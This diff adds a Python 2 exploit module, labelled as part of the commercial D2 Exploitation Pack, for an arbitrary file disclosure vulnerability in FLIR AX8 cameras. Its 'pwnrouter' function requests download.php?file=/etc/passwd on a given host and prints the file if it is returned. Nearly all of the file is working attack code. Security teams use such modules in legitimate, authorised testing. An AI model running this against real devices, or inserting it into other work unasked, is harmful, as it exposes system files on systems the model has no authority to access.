@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_flir_1'
+_vendor_ = 'flir'
+_model_  = ['AX8']
+_vuln_   = 'Arbitrary File Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5493.php'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/download.php?file=/etc/passwd' % (host,port)        
+    response = requests.get(url, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return
+  if 'root:' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text        
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
